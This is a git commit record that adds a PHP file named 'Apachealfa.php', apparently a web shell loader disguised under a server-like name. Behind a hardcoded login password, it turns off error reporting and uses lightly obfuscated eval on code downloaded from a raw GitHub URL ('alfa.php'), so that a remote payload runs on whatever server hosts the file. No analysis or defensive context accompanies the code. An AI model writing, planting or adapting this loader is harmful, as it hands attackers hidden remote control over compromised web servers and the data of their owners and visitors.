1d1c2a8ac567dfe245dd117768200d19289a815c
erosjoko5 <erosjoko5@gmail.com>
2025-07-20 12:38:51 +0700

    Update and rename alfa2pws.php to Apachealfa.php

---
+++ Apachealfa.php
@@ -0,0 +1,31 @@
+<?php
+session_start();
+
+$password = "BAHT123";
+
+if (!isset($_SESSION['authenticated'])) {
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
+        if ($_POST['password'] === $password) {
+            $_SESSION['authenticated'] = true;
+        } else {
+            die("Password salah!");
+        }
+    } else {
+        echo '<form method="POST">
+                <input type="password" name="password" placeholder="Masukkan user">
+                <input type="submit" value="Login">
+              </form>';
+        exit;
+    }
+}
+
+error_reporting(0);
+ini_set('display_errors', 0); ?>
+<?php eval(
+    /**_**/ urldecode("%3f%3e") .
+        file_get_contents(
+            /**_**/ urldecode(
+                /**_**/ "https://raw.githubusercontent.com/erosjoko5/solo/refs/heads/main/alfa.php"
+            )
+        )
+); ?> 
